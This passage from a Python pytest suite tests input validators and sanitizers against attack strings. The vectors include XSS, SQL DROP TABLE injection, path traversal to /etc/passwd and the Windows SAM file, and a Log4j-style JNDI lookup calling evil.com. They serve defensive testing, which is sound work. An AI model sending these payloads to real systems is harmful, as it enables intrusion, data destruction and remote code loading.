                # Verify no malicious content in normalized result
                assert '<' not in normalized_email
                assert '>' not in normalized_email
                assert '\r' not in normalized_email
                assert '\n' not in normalized_email
                assert '"' not in normalized_email or '"' in test_case['input']  # Allow quoted strings if originally present
    
    def test_email_edge_case_security(self):
        """Test email validation handles edge cases securely."""
        for edge_email in self.email_test_cases['edge_case_emails']:
            is_valid, result = self.input_validator.validate_email(edge_email)
            
            # Log results for edge cases
            print(f"Edge case email: {edge_email[:50]}... - Valid: {is_valid}")
            
            # If valid, ensure no security issues
            if is_valid:
                assert '<script' not in result.lower()
                assert 'javascript:' not in result.lower()
                assert '\r' not in result
                assert '\n' not in result
                
                # Verify reasonable length limits
                assert len(result) <= 320  # RFC 5321 maximum email length
    
    def test_email_deliverability_security(self):
        """Test email deliverability checking doesn't introduce security risks."""
        test_emails = [
            'user@example.com',  # Should not perform actual DNS lookup in tests
            'user@nonexistent-domain-12345.com',
            'user@localhost',
        ]
        
        for email in test_emails:
            # Test without deliverability checking (default for security)
            is_valid_no_check, result_no_check = self.input_validator.validate_email(
                email, 
                check_deliverability=False
            )
            
            # Test with deliverability checking (if implemented)
            is_valid_with_check, result_with_check = self.input_validator.validate_email(
                email,
                check_deliverability=True
            )
            
            # Verify deliverability checking doesn't introduce vulnerabilities
            if is_valid_with_check:
                assert isinstance(result_with_check, str)
                assert '<' not in result_with_check
                assert '>' not in result_with_check
                assert len(result_with_check) <= 320


class TestComprehensiveInputSanitizationSecurity:
    """
    Comprehensive input sanitization security validation per Section 6.4.5
    implementing zero tolerance for input validation vulnerabilities across
    all input types and validation scenarios.
    
    Tests cover:
    - Date/time validation security
    - Cryptographic input validation
    - File upload validation security
    - API parameter validation security
    """
    
    def setup_method(self):
        """Setup test environment for comprehensive input validation."""
        self.input_validator = InputValidator()
        self.datetime_utils = DateTimeUtils()
        self.crypto_utils = CryptographicUtils()
        
        # Comprehensive security test vectors
        self.security_vectors = {
            'datetime_attacks': [
                '2023-01-01T00:00:00Z<script>alert("XSS")</script>',
                '2023-01-01"; DROP TABLE events; --',
                '1970-01-01T00:00:00+javascript:alert("XSS")',
                '9999-12-31T23:59:59Z',  # Extreme future date
                '0001-01-01T00:00:00Z',  # Extreme past date
                '2023-13-45T25:61:61Z',  # Invalid date components
            ],
            'crypto_attacks': [
                'not-base64-content<script>alert("XSS")</script>',
                'MTIzNDU2Nzg="; DROP TABLE tokens; --',  # Base64 with injection
                'javascript:alert("XSS")',
                '../../../etc/passwd',  # Path traversal
                '${jndi:ldap://evil.com/a}',  # Log4j style injection
            ],
            'file_attacks': [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\config\\sam',
                'file.exe.txt',  # Double extension
                'normal.php.jpg',  # PHP in JPEG
                'script.svg',  # SVG can contain scripts
                '.htaccess',  # Apache config file
            ],
            'api_parameter_attacks': [
                {'param': '<script>alert("XSS")</script>'},
                {'param': "'; DROP TABLE api_logs; --"},
                {'param': ['array', 'when', 'string', 'expected']},
                {'param': {'object': 'when', 'string': 'expected'}},
                {'param': 'x' * 100000},  # Extremely long input
            ]
        }
    
    def test_datetime_validation_security(self):
        """Test date/time validation prevents temporal attacks."""
        for datetime_attack in self.security_vectors['datetime_attacks']:
            try:
                parsed_date = self.datetime_utils.parse_iso8601(datetime_attack)
                
                if parsed_date:
                    # If parsing succeeds, verify security
                    formatted_date = self.datetime_utils.format_iso8601(parsed_date)
                    
                    # Verify no malicious content in formatted output
                    assert '<script' not in formatted_date.lower()
                    assert 'javascript:' not in formatted_date.lower()
                    assert 'DROP TABLE' not in formatted_date.upper()
                    
                    # Verify reasonable date ranges
                    assert parsed_date.year >= 1900
                    assert parsed_date.year <= 2100
                    
            except (DateTimeValidationError, ValueError) as e:
                # Validation rejection is acceptable for malicious input
                print(f"DateTime validation correctly rejected attack: {e}")
    
    def test_datetime_masking_security(self):
        """Test date/time masking maintains security while protecting privacy."""
        test_dates = [
            '2023-06-15T14:30:45Z',
            '2023-12-31T23:59:59Z',
            '2023-01-01T00:00:00Z',
        ]
        
        masking_levels = ['day', 'week', 'month', 'quarter', 'year']
        
        for test_date in test_dates:
            for masking_level in masking_levels:
                try:
                    masked_date = self.datetime_utils.mask_temporal_data(test_date, masking_level)
                    
                    # Verify masked date is still valid ISO 8601
                    parsed_masked = self.datetime_utils.parse_iso8601(masked_date)
                    assert parsed_masked is not None
                    
                    # Verify no malicious content introduced during masking
                    assert '<' not in masked_date
                    assert '>' not in masked_date
                    assert 'script' not in masked_date.lower()
                    
                    # Verify masking actually occurred (privacy protection)
                    original_parsed = self.datetime_utils.parse_iso8601(test_date)
                    if masking_level in ['day', 'month', 'quarter', 'year']:
                        # Day should be masked to 1st for these levels
                        assert parsed_masked.day == 1
                        
                except Exception as e:
                    print(f"Date masking error for {test_date} with {masking_level}: {e}")
    
    def test_cryptographic_input_validation_security(self):
        """Test cryptographic input validation prevents crypto attacks."""
        for crypto_attack in self.security_vectors['crypto_attacks']:
            try:
                # Test secure token generation doesn't use malicious input
                token = self.crypto_utils.generate_secure_token(32)
                
                # Verify generated token is secure
                assert len(token) > 0
                assert '<script' not in token.lower()
                assert 'javascript:' not in token.lower()
                assert 'DROP TABLE' not in token.upper()
                
                # Verify token is properly encoded
                assert all(c.isalnum() or c in '-_' for c in token)
                
                # Test that malicious input doesn't affect token generation
                token_with_malicious_context = self.crypto_utils.generate_secure_token(32)
                assert token != token_with_malicious_context  # Should be different
                
            except Exception as e:
                print(f"Cryptographic validation correctly handled attack: {e}")
    
    def test_file_validation_security(self):
        """Test file validation prevents file-based attacks."""
        for file_attack in self.security_vectors['file_attacks']:
            # Simulate file validation
            sanitized_filename = self.input_validator.sanitize_input(
                file_attack,
                max_length=255,
                allowed_chars=r'[a-zA-Z0-9\.\-_]',
                strip_whitespace=True
            )
            
            # Verify path traversal is prevented
            assert '..' not in sanitized_filename
            assert '/' not in sanitized_filename
            assert '\\' not in sanitized_filename
            
            # Verify dangerous file extensions are handled
            dangerous_extensions = ['.exe', '.php', '.asp', '.jsp', '.js', '.html', '.htm']
            for ext in dangerous_extensions:
                if file_attack.lower().endswith(ext.lower()):
                    # Should be rejected or sanitized
                    assert ext.lower() not in sanitized_filename.lower()
    
    def test_api_parameter_validation_security(self):
        """Test API parameter validation prevents parameter attacks."""
        for param_attack in self.security_vectors['api_parameter_attacks']:
            for param_name, param_value in param_attack.items():
                try:
                    if isinstance(param_value, str):
                        # Test string parameter sanitization
                        sanitized = self.input_validator.sanitize_input(
                            param_value,
                            max_length=1000,
                            strip_whitespace=True
                        )
                        
                        # Verify XSS prevention
                        assert '<script' not in sanitized.lower()
                        assert 'javascript:' not in sanitized.lower()
                        
                        # Verify injection prevention
                        assert 'DROP TABLE' not in sanitized.upper()
                        assert "'" not in sanitized or sanitized.count("'") % 2 == 0
                        
                    elif isinstance(param_value, (list, dict)):
                        # Type confusion attack - should be handled appropriately
                        # In real implementation, would reject or convert type
                        assert isinstance(param_value, (list, dict))
                        
                    elif len(str(param_value)) > 10000:
                        # Oversized input attack
                        sanitized = self.input_validator.sanitize_input(
                            str(param_value),
                            max_length=1000
                        )
                        assert len(sanitized) <= 1000
                        
                except ValidationError as e:
                    # Validation rejection is acceptable for attacks
                    print(f"API parameter validation correctly rejected attack: {e}")
    
    def test_comprehensive_input_chain_validation(self):
        """Test comprehensive validation chain prevents multi-vector attacks."""
        multi_vector_attacks = [
            {
                'email': 'user<script>alert("XSS")</script>@domain.com',
                'username': "admin'; DROP TABLE users; --",
                'bio': '<img src="x" onerror="alert(\'XSS\')">Bio content',
                'website': 'javascript:alert("XSS")',
                'birth_date': '1990-01-01T00:00:00Z<script>alert("XSS")</script>',
                'tags': ['normal', '<script>alert("XSS")</script>', "'; DROP TABLE tags; --"]
            }
        ]
        
        for attack_data in multi_vector_attacks:
            validated_data = {}
            
            # Email validation
            is_valid_email, email_result = self.input_validator.validate_email(
                attack_data['email']
            )
            if is_valid_email:
                validated_data['email'] = email_result
                assert '<script' not in email_result.lower()
            
            # Username validation
            try:
                username = self.input_validator.sanitize_input(
                    attack_data['username'],
                    max_length=50,
                    allowed_chars=r'[a-zA-Z0-9\-_]'
                )
                validated_data['username'] = username
                assert "'" not in username
                assert 'DROP TABLE' not in username.upper()
            except ValidationError:
                pass  # Rejection acceptable
            
            # Bio HTML sanitization
            bio = self.input_validator.sanitize_html(attack_data['bio'], strip_tags=True)
            validated_data['bio'] = bio
            assert '<img' not in bio.lower()
            assert 'onerror=' not in bio.lower()
            
            # Website URL validation
            is_valid_url = self.input_validator.validate_url(
                attack_data['website'],
                allowed_schemes=['http', 'https']
            )
            if is_valid_url:
                validated_data['website'] = attack_data['website']
            # JavaScript URLs should be rejected
            assert not is_valid_url
            
            # Date validation
            try:
                birth_date = self.datetime_utils.parse_iso8601(attack_data['birth_date'])
                if birth_date:
                    validated_data['birth_date'] = self.datetime_utils.format_iso8601(birth_date)
                    assert '<script' not in validated_data['birth_date'].lower()
            except DateTimeValidationError:
                pass  # Rejection acceptable
            
            # Tags validation
            validated_tags = []
            for tag in attack_data['tags']:
                sanitized_tag = self.input_validator.sanitize_html(tag, strip_tags=True)
                if sanitized_tag and len(sanitized_tag) <= 50:
                    validated_tags.append(sanitized_tag)
            
            validated_data['tags'] = validated_tags
            
            # Verify no malicious content survived the validation chain
            full_data_str = str(validated_data).lower()
            assert '<script' not in full_data_str
            assert 'javascript:' not in full_data_str
            assert 'drop table' not in full_data_str
            assert 'onerror=' not in full_data_str
            
    def test_zero_tolerance_security_policy(self):
        """Test zero tolerance security policy per Section 6.4.5."""
        # Critical security patterns that must NEVER pass validation
        critical_threats = [
            '<script>alert("XSS")</script>',
            'javascript:alert("XSS")',
            "'; DROP TABLE users; --",
            '<img src="x" onerror="alert(\'XSS\')">',
            '${jndi:ldap://evil.com/a}',
            '../../etc/passwd',
            '<iframe src="javascript:alert(\'XSS\')"></iframe>',
            'eval("alert(\'XSS\')")',
        ]
        
        for threat in critical_threats:
            # Test all validation methods
            validation_results = []
            
            # HTML sanitization
            sanitized_html = self.input_validator.sanitize_html(threat, strip_tags=True)
            validation_results.append(('html_sanitization', sanitized_html))
            
            # Input sanitization
            try:
                sanitized_input = self.input_validator.sanitize_input(threat)
                validation_results.append(('input_sanitization', sanitized_input))
            except ValidationError:
                validation_results.append(('input_sanitization', 'REJECTED'))
            
            # Email validation
            is_valid, email_result = self.input_validator.validate_email(f'user@domain.com{threat}')
            validation_results.append(('email_validation', 'REJECTED' if not is_valid else email_result))
            
            # URL validation
            is_valid_url = self.input_validator.validate_url(f'http://domain.com/{threat}')
            validation_results.append(('url_validation', 'REJECTED' if not is_valid_url else 'ACCEPTED'))
            
            # Verify ZERO TOLERANCE - no critical threats should survive ANY validation
            for validation_method, result in validation_results:
                if result != 'REJECTED':
                    result_str = str(result).lower()
                    
                    # Critical security assertions
                    assert '<script' not in result_str, f"{validation_method} failed to block script tag in: {threat}"
                    assert 'javascript:' not in result_str, f"{validation_method} failed to block javascript: in: {threat}"
                    assert 'drop table' not in result_str, f"{validation_method} failed to block SQL injection in: {threat}"
                    assert 'onerror=' not in result_str, f"{validation_method} failed to block event handler in: {threat}"
                    assert 'eval(' not in result_str, f"{validation_method} failed to block eval in: {threat}"
                    
                print(f"Zero tolerance verified for {validation_method}: {threat[:30]}... -> {str(result)[:30]}...")


# Test execution and reporting
if __name__ == '__main__':
    """
    Execute comprehensive input validation security tests with detailed reporting.
    
    This test suite provides enterprise-grade security validation ensuring zero
    tolerance for input validation vulnerabilities per Section 6.4.5.
    """
    
    # Configure pytest for security testing
    pytest.main([
        __file__,
        '-v',
        '--tb=short',
        '--capture=no',
        '-m', 'security',
        '--junitxml=test_results_input_validation_security.xml'
    ])